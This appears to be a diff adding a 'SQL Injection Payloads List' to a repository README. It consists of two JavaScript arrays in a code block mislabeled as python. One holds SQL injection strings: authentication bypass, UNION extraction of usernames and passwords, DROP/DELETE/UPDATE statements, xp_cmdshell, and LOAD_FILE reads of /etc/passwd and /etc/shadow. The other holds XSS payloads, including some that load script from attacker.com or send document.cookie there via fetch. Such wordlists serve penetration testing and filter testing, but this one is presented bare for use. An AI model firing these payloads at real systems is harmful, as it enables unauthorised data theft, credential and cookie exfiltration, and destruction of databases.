@@ -1,2 +1,118 @@
-# sql-injection
-SQL INJECTION WORD LIST
+# SQL Injection Payloads List
+
+
+SQL Injection Payloads List
+
+
+
+```python
+
+#💉 SQL Injection Payloads List
+
+const sqlPayloads = [
+    "'", '"', "' OR 1=1 --", '" OR 1=1 --', "' UNION SELECT 1,2 --", "'; DROP TABLE users; --",
+    "' OR 'a'='a", "' OR 'a'='a' --", "'; EXEC xp_cmdshell('ping 127.0.0.1'); --",
+    "'; WAITFOR DELAY '0:0:5' --", "'; SELECT SLEEP(5) --", "'; SELECT pg_sleep(5) --",
+    "'; SELECT sleep(5) --", "admin'--", "admin' #", "admin'/*", "' OR 1=1#", "' OR 1=1--",
+    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR 1=1 LIMIT 1;--",
+    "' OR 1=1 LIMIT 1;#", "' OR 1=1 LIMIT 1;/*", "1' OR '1'='1", "1' OR '1'='1'/*",
+    "1' OR '1'='1'#", "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "' OR ''='", "' OR '='",
+    "1' AND '1'='1", "1' AND '1'='2", "' AND 1=1--", "' AND 1=2--", "' AND 'x'='x",
+    "' AND 'x'='y", "' AND 1=1 #", "' AND 2>1 --",
+    "' UNION ALL SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT username,password FROM users--", "' UNION SELECT database()--",
+    "' UNION SELECT user()--", "' UNION SELECT version()--",
+    "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5('A'))--", "' OR SLEEP(5)--",
+    "1' AND SLEEP(5)#", "' AND IF(1=1,SLEEP(5),0)--",
+    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()),0x7e))--",
+    "1' AND UpdateXml(1, Concat(0x7e, (SELECT database()),0x7e), 1)--",
+    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' ORDER BY 4--", "1' ORDER BY 5--",
+    "' GROUP BY 1--", "' GROUP BY 2--", "' GROUP BY 3--",
+    "1' UNION SELECT table_schema,table_name FROM information_schema.tables--",
+    "1' UNION SELECT column_name,column_type FROM information_schema.columns--",
+    "' UNION SELECT @@version,NULL--", "' UNION SELECT @@datadir,NULL--",
+    "'; DROP TABLE users;--", "'; DELETE FROM users;--", "'; UPDATE users SET password='hacked';--",
+    "'; INSERT INTO users VALUES('hacker','hacked');--", "'; TRUNCATE TABLE users;--",
+    "' OR 'x'='x' OR 'x'='", "' OR 'a'>'", "' OR 'a'<'", "' OR 'a'='a",
+    "' OR 'a'!='", "' OR 2 BETWEEN 1 AND 3--",
+    "' OR 1=1; --", "' UNION SELECT NULL,NULL,NULL,NULL;--",
+    "' UNION SELECT tablename,NULL FROM pg_tables;--",
+    "' UNION SELECT username,NULL FROM all_users;--",
+    "' UNION SELECT table_name,NULL FROM user_tables;--",
+    "' EXEC sp_databases;--", "' EXEC sp_tables;--",
+    "' UNION SELECT name,NULL FROM sqlite_master;--",
+    "1' AND '1'=('1", "1' AND 1=1--", "1) AND (1=1--", "1) OR (1=1--",
+    "' OR IF(1=1,'true','false')--", "' OR IF(LENGTH(database())>2,'true','false')--",
+    "' UNION SELECT IF(1=1,version(),NULL)--",
+    "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
+    "1' UNION SELECT LOAD_FILE('/etc/shadow')--",
+    "' OR SUBSTR(user(),1,1)='a'--", "' OR ASCII(SUBSTR(user(),1,1))>64--",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
+    "' AND (SELECT COUNT(*) FROM users) > 0--",
+    "' UNION SELECT CAST(id AS CHAR),CAST(name AS CHAR)--",
+    "' UNION SELECT CONCAT(user,':',password) FROM mysql.user--",
+    "admin' OR 'x'='x' --", "' OR '1'='1' UNION SELECT NULL,NULL--",
+    "' OR 1=1 UNION ALL SELECT NULL--",
+];
+
+
+XSS
+
+const xssPayloads = [
+    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
+    "javascript:alert(1)", "<svg onload=alert('XSS')>", "<svg/onload=alert(1)>",
+    "<body onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>", "<select onfocus=alert('XSS') autofocus>",
+    "<textarea onfocus=alert('XSS') autofocus>", "<marquee onstart=alert('XSS')>",
+    "<details open ontoggle=alert('XSS')>", "<video src=x onerror=alert('XSS')>",
+    "<audio src=x onerror=alert('XSS')>", "<source onerror=alert('XSS')>",
+    "<track onload=alert('XSS')>", "<embed src=javascript:alert('XSS')>",
+    "<object data=javascript:alert('XSS')>", "<form action=javascript:alert('XSS')>",
+    "<isindex type=image src=1 onerror=alert('XSS')>", "<img src=1 alt=x onerror=alert('XSS')>",
+    "<img/src=x onerror=alert('XSS')>", "<img src=\"x\" onerror=\"alert('XSS')\">",
+    "<div onmouseover=alert('XSS')>", "<div onmouseenter=alert('XSS')>",
+    "<div onmouseleave=alert('XSS')>", "<div onmousemove=alert('XSS')>",
+    "<div onmouseout=alert('XSS')>", "<div onmousedown=alert('XSS')>",
+    "<div onmouseup=alert('XSS')>", "<div onclick=alert('XSS')>",
+    "<div ondblclick=alert('XSS')>", "<a href=javascript:alert('XSS')>XSS</a>",
+    "<a href='javascript:alert(1)'>Click</a>", "<button onclick=alert('XSS')>Click</button>",
+    "<button form=x formaction=javascript:alert('XSS')>Click</button>",
+    "<fieldset onfocus=alert('XSS') autofocus>", "<legend onfocus=alert('XSS') autofocus>",
+    "<label onfocus=alert('XSS') autofocus>", "<table background=javascript:alert('XSS')>",
+    "<div style=\"background:url(javascript:alert('XSS'))\">",
+    "<div style=\"background-image:url(javascript:alert('XSS'))\">",
+    "<style>body{background:url(javascript:alert(1))}</style>",
+    "<link rel=stylesheet href=javascript:alert('XSS')>", "<base href=javascript:alert('XSS')//>",
+    "<meta http-equiv=refresh content=\"0;url=javascript:alert('XSS')\">",
+    "<frame src=javascript:alert('XSS')>", "<iframe onload=alert('XSS')>",
+    "<frameset onload=alert('XSS')>", "<script src=http://attacker.com/xss.js></script>",
+    "<svg><script>alert('XSS')</script></svg>", "<svg><animate onbegin=alert('XSS')>",
+    "<svg><set onbegin=alert('XSS')>", "<svg><animateTransform onbegin=alert('XSS')>",
+    "<svg><path onmouseover=alert('XSS')>", "<svg><rect onmouseover=alert('XSS')>",
+    "<svg><circle onmouseover=alert('XSS')>", "<svg><ellipse onmouseover=alert('XSS')>",
+    "<math><mi xlink:href=javascript:alert('XSS')>", "<form onsubmit=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus value=x>", "<input type=image src=x onerror=alert('XSS')>",
+    "<input type=range oninput=alert('XSS')>", "<input type=color onchange=alert('XSS')>",
+    "<input type=date onchange=alert('XSS')>", "<input type=email onchange=alert('XSS')>",
+    "<keygen onfocus=alert('XSS') autofocus>", "<meter onmouseover=alert('XSS')>",
+    "<progress onmouseover=alert('XSS')>", "<span onmouseover=alert('XSS')>",
+    "<code onmouseover=alert('XSS')>", "<kbd onmouseover=alert('XSS')>",
+    "<article onmouseover=alert('XSS')>", "<header onmouseover=alert('XSS')>",
+    "<nav onmouseover=alert('XSS')>", "<section onmouseover=alert('XSS')>",
+    "<footer onmouseover=alert('XSS')>", "<canvas onmouseover=alert('XSS')>",
+    "<dialog open onmouseover=alert('XSS')>", "<button onmouseover=alert('XSS')>",
+    "<strong onmouseover=alert('XSS')>", "<em onmouseover=alert('XSS')>",
+    "<ul onmouseover=alert('XSS')>", "<li onmouseover=alert('XSS')>",
+    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+    "<img src=x onerror=\"window.location='http://attacker.com/'\">",
+    "<img src=x onerror=\"setTimeout(alert,1000)\">",
+    "<img src=x onerror=\"setInterval(alert,1000)\">",
+    "<img src=x onerror=\"fetch('http://attacker.com/?c='+btoa(document.cookie))\">",
+    "<a href='data:text/html,<script>alert(1)</script>'>XSS</a>",
+    "<img src=x onerror=\"console.log('XSS')\">",
+    "'\"><script>alert(1)</script><\"",
+];
+
+
+```
